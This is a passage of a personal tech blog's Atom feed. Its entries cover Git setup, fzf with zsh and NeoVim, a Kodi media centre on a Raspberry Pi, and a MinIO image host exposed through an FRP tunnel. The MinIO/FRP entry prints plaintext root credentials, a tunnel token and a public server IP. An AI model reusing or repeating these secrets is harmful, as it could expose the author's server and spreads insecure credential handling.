&lt;h2 id=&quot;Initial-the-Git-configuration&quot;&gt;&lt;a href=&quot;#Initial-the-Git-configuration&quot; class=&quot;headerlink&quot; title=&quot;Initial the Git configuration&quot;&gt;&lt;/a&gt;Initial the Git configuration&lt;/h2&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;git config --global user.name  &lt;span class=&quot;string&quot;&gt;&amp;quot;name&amp;quot;&lt;/span&gt; //你的GitHub登陆名&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;git config --global user.email &lt;span class=&quot;string&quot;&gt;&amp;quot;123@126.com&amp;quot;&lt;/span&gt; //你的GitHub注册邮箱&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="TechLearning" scheme="https://resek4.github.io/categories/TechLearning/"/>
    
    
  </entry>
  
  <entry>
    <title>fzf(Fuzzy File Finder) enhances the efficiency and convenience of your command-line workflow.</title>
    <link href="https://resek4.github.io/2022/12/31/fzf/"/>
    <id>https://resek4.github.io/2022/12/31/fzf/</id>
    <published>2022-12-30T16:00:00.000Z</published>
    <updated>2023-03-22T15:21:17.707Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Installation-of-fzf"><a href="#Installation-of-fzf" class="headerlink" title="Installation of fzf"></a>Installation of fzf</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Install the fzf itself by Homebrew</span></span><br><span class="line">brew install fzf</span><br><span class="line"></span><br><span class="line"><span class="comment"># Install the auto-completion and the key bindings</span></span><br><span class="line"><span class="comment"># Add the .fzf.zsh which contains the configuration of these downloaded files to the .bashrc and the .zshrc</span></span><br><span class="line">$(brew --prefix)/opt/fzf/install</span><br></pre></td></tr></table></figure><p><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/20221231034712.png" alt="image.png"></p><span id="more"></span><ul><li>The <code>.fzf.zsh</code> file default contents are these below:</li><li><code>key-bindings.zsh</code> only contains <code>CTRL-R</code>, <code>CTRL-T</code>, and <code>ALT-C</code><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Setup fzf</span></span><br><span class="line"><span class="comment"># ---------</span></span><br><span class="line"><span class="keyword">if</span> [[ ! <span class="string">&quot;<span class="variable">$PATH</span>&quot;</span> == */opt/homebrew/opt/fzf/bin* ]]; <span class="keyword">then</span></span><br><span class="line">  PATH=<span class="string">&quot;<span class="variable">$&#123;PATH:+<span class="variable">$&#123;PATH&#125;</span>:&#125;</span>/opt/homebrew/opt/fzf/bin&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Auto-completion</span></span><br><span class="line"><span class="comment"># ---------------</span></span><br><span class="line">[[ $- == *i* ]] &amp;&amp; <span class="built_in">source</span> <span class="string">&quot;/opt/homebrew/opt/fzf/shell/completion.zsh&quot;</span> 2&gt; /dev/null</span><br><span class="line"></span><br><span class="line"><span class="comment"># Key bindings</span></span><br><span class="line"><span class="comment"># ------------</span></span><br><span class="line"><span class="built_in">source</span> <span class="string">&quot;/opt/homebrew/opt/fzf/shell/key-bindings.zsh&quot;</span></span><br></pre></td></tr></table></figure></li></ul><h1 id="Link-with-NeoVIM"><a href="#Link-with-NeoVIM" class="headerlink" title="Link with NeoVIM"></a>Link with NeoVIM</h1><h2 id="Installation-init-vim"><a href="#Installation-init-vim" class="headerlink" title="Installation(init.vim)"></a>Installation(init.vim)</h2><ul><li>If there is no fzf binary files have been installed before, We should install fzf separately in NeoVim(By Vim-Plug or something else).<br>Otherwise, we could only specify the fzf pathname in our local drive which is enough.<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&quot; If there is no fzf binary files before</span></span><br><span class="line">Plug <span class="string">&#x27;junegunn/fzf&#x27;</span>, &#123; <span class="string">&#x27;do&#x27;</span>: &#123; -&gt; fzf#install() &#125; &#125;</span><br><span class="line">Plug <span class="string">&#x27;junegunn/fzf.vim&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; If fzf has been installed at the local drive</span></span><br><span class="line">Plug <span class="string">&#x27;/opt/homebrew/opt/fzf&#x27;</span></span><br><span class="line">Plug <span class="string">&#x27;junegunn/fzf.vim&#x27;</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="Configuration-init-vim"><a href="#Configuration-init-vim" class="headerlink" title="Configuration(init.vim)"></a>Configuration(init.vim)</h2><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> $FZF_DEFAULT_OPTS=<span class="string">&quot;--height 40% --border --preview &#x27;bat --style=numbers --color=always --line-range :500 &#123;&#125;&#x27;&quot;</span></span><br><span class="line"></span><br><span class="line">command! -bang -nargs=? -<span class="built_in">complete</span>=dir Files <span class="keyword">call</span> fzf#vim#files(<span class="string">&#x27;~/&#x27;</span>, <span class="symbol">&lt;bang&gt;</span><span class="number">0</span>)</span><br><span class="line"><span class="keyword">nnoremap</span> <span class="symbol">&lt;C-f&gt;</span> :Files<span class="symbol">&lt;CR&gt;</span></span><br><span class="line"></span><br><span class="line">command! -bang -nargs=* MRU <span class="keyword">call</span> fzf#vim#history(fzf#vim#with_preview())</span><br><span class="line"><span class="keyword">noremap</span> <span class="symbol">&lt;C-h&gt;</span> :MRU<span class="symbol">&lt;CR&gt;</span></span><br><span class="line"></span><br><span class="line">command! -bang -nargs=* Ag</span><br><span class="line">\ <span class="keyword">call</span> fzf#vim#ag(</span><br><span class="line">\<span class="string">&#x27;&#x27;</span>,</span><br><span class="line">\<span class="symbol">&lt;bang&gt;</span><span class="number">0</span> ? fzf#vim#with_preview(<span class="string">&#x27;up:60%&#x27;</span>)</span><br><span class="line">\: fzf#vim#with_preview(<span class="string">&#x27;right:50%&#x27;</span>, <span class="string">&#x27;?&#x27;</span>),</span><br><span class="line">\<span class="symbol">&lt;bang&gt;</span><span class="number">0</span>)</span><br><span class="line"><span class="keyword">noremap</span> <span class="symbol">&lt;C-c&gt;</span> :Ag<span class="symbol">&lt;CR&gt;</span></span><br></pre></td></tr></table></figure><p>There are defined 3 keybindings(<code>CTRL-f</code>, <code>CTRL-h</code>, <code>CTRL-c</code>), and <code>Ag</code> was used software installed in our local drive called <em>The silver searcher</em> (<a href="https://github.com/ggreer/the_silver_searcher">GitHub - ggreer&#x2F;the_silver_searcher: A code-searching tool similar to ack, but faster.</a>)</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Installation-of-fzf&quot;&gt;&lt;a href=&quot;#Installation-of-fzf&quot; class=&quot;headerlink&quot; title=&quot;Installation of fzf&quot;&gt;&lt;/a&gt;Installation of fzf&lt;/h1&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# Install the fzf itself by Homebrew&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;brew install fzf&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# Install the auto-completion and the key bindings&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# Add the .fzf.zsh which contains the configuration of these downloaded files to the .bashrc and the .zshrc&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$(brew --prefix)/opt/fzf/install&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&quot;https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/20221231034712.png&quot; alt=&quot;image.png&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Toolkit" scheme="https://resek4.github.io/categories/Toolkit/"/>
    
    
  </entry>
  
  <entry>
    <title>使用 Raspberry Pi 搭建 Kodi 家庭影院</title>
    <link href="https://resek4.github.io/2022/12/09/%E6%A0%91%E8%8E%93%E6%B4%BE%E6%90%AD%E5%BB%BA%E5%AE%B6%E5%BA%AD%E5%BD%B1%E9%99%A2/"/>
    <id>https://resek4.github.io/2022/12/09/%E6%A0%91%E8%8E%93%E6%B4%BE%E6%90%AD%E5%BB%BA%E5%AE%B6%E5%BA%AD%E5%BD%B1%E9%99%A2/</id>
    <published>2022-12-08T16:00:00.000Z</published>
    <updated>2023-02-26T05:25:33.791Z</updated>
    
    <content type="html"><![CDATA[<h1 id="下载kodi"><a href="#下载kodi" class="headerlink" title="下载kodi"></a>下载kodi</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install kodi</span><br></pre></td></tr></table></figure><h1 id="配置kodi自启动"><a href="#配置kodi自启动" class="headerlink" title="配置kodi自启动"></a>配置kodi自启动</h1><ul><li>配置服务<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /lib/systemd/system/kodi.service</span><br></pre></td></tr></table></figure></li></ul><p>并输入以下内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description = Kodi Media Center</span><br><span class="line">After = remote-fs.target network-online.target</span><br><span class="line">Wants = network-online.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type = simple</span><br><span class="line">ExecStart = /usr/bin/kodi-standalone</span><br><span class="line">Restart = on-abort</span><br><span class="line">RestartSec = 5</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy = multi-user.target</span><br></pre></td></tr></table></figure><span id="more"></span><p>刷新sytemctl，并启用相关服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl-reload</span><br><span class="line">sudo systemctl start kodi</span><br><span class="line">sudo systemctl <span class="built_in">enable</span> kodi</span><br><span class="line"><span class="comment"># 可以查看服务器启动情况</span></span><br><span class="line">sudo systemctl status kodi</span><br></pre></td></tr></table></figure><p>使用以下命令，达到打开电视自动启动kodi</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kodi &gt;/dev/null 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure><h1 id="配置HDMI强制热插拔"><a href="#配置HDMI强制热插拔" class="headerlink" title="配置HDMI强制热插拔"></a>配置HDMI强制热插拔</h1><p>如果不配置这个选项，那么只有当树莓派启动的时候才会检测hdmi信息，达不到开电视即可看的效果<br>修改</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /boot/config.txt</span><br></pre></td></tr></table></figure><p>将其中如下行的注释符去掉</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hdmi_force_hotplug=1</span><br></pre></td></tr></table></figure><h1 id="使用kodi"><a href="#使用kodi" class="headerlink" title="使用kodi"></a>使用kodi</h1><h2 id="使用内网文件共享"><a href="#使用内网文件共享" class="headerlink" title="使用内网文件共享"></a>使用内网文件共享</h2><ul><li>Mac上</li></ul><ol><li>系统偏好设置-用户和组-添加一个新的用户（用户名&#x2F;密码）</li><li>系统偏好设置-通用-共享-打开文件共享<br>并且打开右边的信息，配置具体共享的文件夹，及共享人<br><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/20221211150339.png"></li></ol><ul><li>Windows上</li></ul><ol><li>WIndows可选功能中，添加“SMB 1.0”的功能</li><li>对想要共享的文件夹，设置高级共享即可</li></ol><p>配置好共享后，可以在kodi中添加视频</p><h2 id="配置插件"><a href="#配置插件" class="headerlink" title="配置插件"></a>配置插件</h2><h3 id="IPTV"><a href="#IPTV" class="headerlink" title="IPTV"></a>IPTV</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载kodi-pvr-iptvsimple</span></span><br><span class="line">sudo apt install kodi-pvr-iptvsimple</span><br></pre></td></tr></table></figure><h3 id="刮削器"><a href="#刮削器" class="headerlink" title="刮削器"></a>刮削器</h3><p>kodi自带的本身刮削器就很好用，不管是电影还是剧集均取自于在线网站：<a href="https://www.themoviedb.org/?language=en-US">The Movie Database (TMDB)</a></p><p>在kodi配置好代理的情况下，添加文件便可自动使用刮削器对电影的信息进行在线采集，但是电影的文件名需规范化</p><ol><li><p>不管是电影（Movies）还是剧集（TV Episode），文件名均需要去TMDB上看已有的电影名是怎么规范化书写的，同时<em><strong>注意加上年份</strong></em>。<img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/20221211151416.png">例如本剧，则需要写成“***浴血黑帮(2013)***”</p></li><li><p>如果是剧集，那么文件结构最好是<br>规范化的剧集名-季分类信息-每一集的信息<br>季分类信息最好是“Season 1, Season 2”<br>分集信息最好包含***规范化的S(Season)及E(Episode)***“xxxx.S01E02.xxx-xxx.mp4”</p></li><li><p>如果文件名是中文，kodi的插件脚本会自动获取TMDB上该电影&#x2F;剧集的中文信息，如果想获取英文信息，同理需要把文件名按规范改为英文名</p></li><li><p>如果发现某些季&#x2F;集在TMDB上没有，那么可以在TMDB上注册一个账号，自己来添加</p></li></ol><h1 id="如果是在不同网段下"><a href="#如果是在不同网段下" class="headerlink" title="如果是在不同网段下"></a>如果是在不同网段下</h1><p>开启路由器的AP模式（有线中继）<br>这时候chen-2.4就和chen4在同一个网段下了，同时wifi还互不干扰<br>分别设置树莓派和电脑的静态IP<br>如果ping不通，很有可能是windows防火墙没有设置好<br>可以在windows防火墙中，设置</p><ul><li>SMB</li><li>文件共享</li><li>V2ray</li><li>V2rayN</li><li>xray<br>的通过策略</li></ul><p>以ping通为准<br>如果windows的ip变化了，记得更改电影&#x2F;剧集的视频源+代理信息</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;下载kodi&quot;&gt;&lt;a href=&quot;#下载kodi&quot; class=&quot;headerlink&quot; title=&quot;下载kodi&quot;&gt;&lt;/a&gt;下载kodi&lt;/h1&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;sudo apt install kodi&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h1 id=&quot;配置kodi自启动&quot;&gt;&lt;a href=&quot;#配置kodi自启动&quot; class=&quot;headerlink&quot; title=&quot;配置kodi自启动&quot;&gt;&lt;/a&gt;配置kodi自启动&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;配置服务&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;sudo vim /lib/systemd/system/kodi.service&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;并输入以下内容&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;[Unit]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Description = Kodi Media Center&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;After = remote-fs.target network-online.target&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Wants = network-online.target&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;[Service]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Type = simple&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ExecStart = /usr/bin/kodi-standalone&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Restart = on-abort&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;RestartSec = 5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;[Install]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;WantedBy = multi-user.target&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="HackStyle" scheme="https://resek4.github.io/categories/HackStyle/"/>
    
    
  </entry>
  
  <entry>
    <title>使用 Raspberry Pi 自建 MinIO 图床</title>
    <link href="https://resek4.github.io/2022/12/07/%E6%A0%91%E8%8E%93%E6%B4%BE%E8%87%AA%E5%BB%BA%E5%9B%BE%E5%BA%8A/"/>
    <id>https://resek4.github.io/2022/12/07/%E6%A0%91%E8%8E%93%E6%B4%BE%E8%87%AA%E5%BB%BA%E5%9B%BE%E5%BA%8A/</id>
    <published>2022-12-06T16:00:00.000Z</published>
    <updated>2023-01-27T09:00:08.724Z</updated>
    
    <content type="html"><![CDATA[<h1 id="在服务器-x2F-树莓派搭建MinIO"><a href="#在服务器-x2F-树莓派搭建MinIO" class="headerlink" title="在服务器&#x2F;树莓派搭建MinIO"></a>在服务器&#x2F;树莓派搭建MinIO</h1><p>我使用的图床为MinIO，可以使用docker一键搭建<br>其中账号和密码均在其中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">docker run \</span><br><span class="line">  -p 9000:9000 \</span><br><span class="line">  -p 9001:9001 \</span><br><span class="line">  --name minio1 \</span><br><span class="line">  -v /data/minio/data:/data \</span><br><span class="line">  -v /data/minio/config:/root/.minio \</span><br><span class="line">  -e <span class="string">&quot;MINIO_ROOT_USER=IHCVodsfa23jsksssv12&quot;</span> \</span><br><span class="line">  -e <span class="string">&quot;MINIO_ROOT_PASSWORD=IUH2ioh23xxIid33&quot;</span> \</span><br><span class="line">  -e MINIO_SERVER_URL=http://localhost:9000 \</span><br><span class="line">  quay.io/minio/minio server /data \</span><br><span class="line">  --address <span class="string">&quot;:9000&quot;</span> --console-address <span class="string">&quot;:9001&quot;</span> \</span><br></pre></td></tr></table></figure><p>设置启动docker便自启动容器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker update --restart=always minio1</span><br></pre></td></tr></table></figure><span id="more"></span><h1 id="使用树莓派进行FRP内网穿透"><a href="#使用树莓派进行FRP内网穿透" class="headerlink" title="使用树莓派进行FRP内网穿透"></a>使用树莓派进行FRP内网穿透</h1><h2 id="在服务器端搭建frps"><a href="#在服务器端搭建frps" class="headerlink" title="在服务器端搭建frps"></a>在服务器端搭建frps</h2><p>按照服务器架构在github上下载frp包，服务器端我们只会用到<code>frps</code>和<code>frps.ini</code></p><p>配置<code>frps.ini</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port = 7000</span><br><span class="line">token = xii21n12noci</span><br></pre></td></tr></table></figure><p>这里的common端口即为frp的通信端口，需与客户端保持一致<br>token可为通信进行加密，需与客户端保持一致</p><h2 id="在客户端搭建frpc"><a href="#在客户端搭建frpc" class="headerlink" title="在客户端搭建frpc"></a>在客户端搭建frpc</h2><p>同理按照客户端架构在github上下载frp包，客户端我们只会用到<code>frpc</code>和<code>frpc.ini</code></p><p>配置<code>frpc.ini</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 120.48.17.251</span><br><span class="line">server_port = 7000</span><br><span class="line">token = xii21n12noci</span><br><span class="line"></span><br><span class="line">[picgo]</span><br><span class="line"><span class="built_in">type</span> = tcp</span><br><span class="line">local_ip = 127.0.0.1</span><br><span class="line">local_port = 9000</span><br><span class="line">remote_port = 9000</span><br><span class="line"><span class="comment">#访问远程的9000即访问本地的9000</span></span><br></pre></td></tr></table></figure><p>common中的 <em>server_addr</em> 需为frps服务器的地址<br>端口和token需与服务器保持一致</p><p>下方为连接服务， <em>local_ip</em> 和 <em>local_port</em> 代表着本地ip及端口，<em>remote_ip</em> 代表着服务器的端口，意思即为：<em><strong>当访问服务器的9000端口时，将TCP流量转发至127.0.0.1:9000（本地的9000端口）</strong></em></p><h2 id="置frpc-x2F-frps服务器开机自启"><a href="#置frpc-x2F-frps服务器开机自启" class="headerlink" title="置frpc&#x2F;frps服务器开机自启"></a>置frpc&#x2F;frps服务器开机自启</h2><p>新建systemctl文件，系统自启进程名自行更改</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /lib/systemd/system/frpc.service</span><br></pre></td></tr></table></figure><p>写入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=frpc</span><br><span class="line">After=multi-user.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">TimeoutStartSec=10</span><br><span class="line">RestartSec=30s</span><br><span class="line">Restart=always</span><br><span class="line">ExecStart=/usr/bin/frpc -c /etc/frpc.ini</span><br><span class="line">ExecStop=/bin/kill <span class="variable">$MAINPID</span></span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure><p>然后启动相关服务即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 更新服务文件</span></span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line"><span class="comment"># 开启</span></span><br><span class="line">sudo systemctl start frpc</span><br><span class="line"><span class="comment"># 设置开机启动</span></span><br><span class="line">sudo systemctl <span class="built_in">enable</span> frpc</span><br><span class="line"><span class="comment"># 查看状态</span></span><br><span class="line">sudo systemctl status frpc</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;在服务器-x2F-树莓派搭建MinIO&quot;&gt;&lt;a href=&quot;#在服务器-x2F-树莓派搭建MinIO&quot; class=&quot;headerlink&quot; title=&quot;在服务器&amp;#x2F;树莓派搭建MinIO&quot;&gt;&lt;/a&gt;在服务器&amp;#x2F;树莓派搭建MinIO&lt;/h1&gt;&lt;p&gt;我使用的图床为MinIO，可以使用docker一键搭建&lt;br&gt;其中账号和密码均在其中&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;docker run \&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  -p 9000:9000 \&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  -p 9001:9001 \&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  --name minio1 \&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  -v /data/minio/data:/data \&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  -v /data/minio/config:/root/.minio \&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  -e &lt;span 